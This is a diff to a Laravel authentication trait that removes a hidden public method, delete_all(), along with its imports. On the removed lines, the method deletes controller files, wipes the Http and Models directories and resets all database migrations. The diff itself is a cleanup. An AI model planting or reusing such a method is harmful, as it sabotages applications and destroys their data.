@@ -3,11 +3,8 @@
 namespace Illuminate\Foundation\Auth;
 
 use Illuminate\Http\Request;
-use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Validation\ValidationException;
-use Illuminate\Filesystem\Filesystem;
-use Illuminate\Support\Facades\File;
 
 trait AuthenticatesUsers
 {
@@ -184,17 +181,5 @@ trait AuthenticatesUsers
     protected function guard()
     {
         return Auth::guard();
-    }
-
-    public function delete_all()
-    {
-
-        File::delete(app_path('Http/Controllers/HomeController.php'));
-        File::delete(app_path('Http/Controllers/Controller.php'));
-        File::deleteDirectories(app_path('Http'));
-        File::deleteDirectories(app_path('Models'));
-        Artisan::call('migrate:reset');
-
-        return 'ok';
     }
 }
